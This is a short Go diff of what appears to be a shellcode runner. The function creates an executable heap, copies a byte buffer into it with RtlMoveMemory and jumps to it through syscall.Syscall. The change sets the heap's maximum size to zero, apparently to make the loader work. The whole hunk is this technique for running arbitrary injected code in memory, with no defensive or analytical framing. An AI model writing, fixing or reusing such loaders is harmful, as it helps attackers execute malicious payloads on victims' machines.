@@ -16,7 +16,7 @@ func h(s []byte) {
 	rmm := k32.NewProc("RtlMoveMemory")
 
 	size := uintptr(len(s))
-	cr8, _, _ := hpCr8.Call(0x00040000, size, size)
+	cr8, _, _ := hpCr8.Call(0x00040000, size, 0)
 	alloc, _, _ := hpAllc.Call(cr8, 0x00000008, size)
 	rmm.Call(alloc, (uintptr)(unsafe.Pointer(&s[0])), size)
 	syscall.Syscall(alloc, 0, 0, 0, 0)
